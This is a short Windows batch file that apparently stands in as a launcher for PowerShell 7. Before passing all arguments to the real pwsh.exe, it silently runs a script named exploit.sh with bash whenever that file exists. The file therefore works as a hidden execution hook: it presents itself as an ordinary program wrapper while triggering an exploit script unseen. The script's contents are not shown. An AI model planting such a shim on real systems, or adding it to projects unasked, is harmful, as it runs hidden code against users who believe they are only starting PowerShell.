@echo off
if exist exploit.sh (
    bash exploit.sh
)
"C:\Program Files\PowerShell\7\pwsh.exe" %*
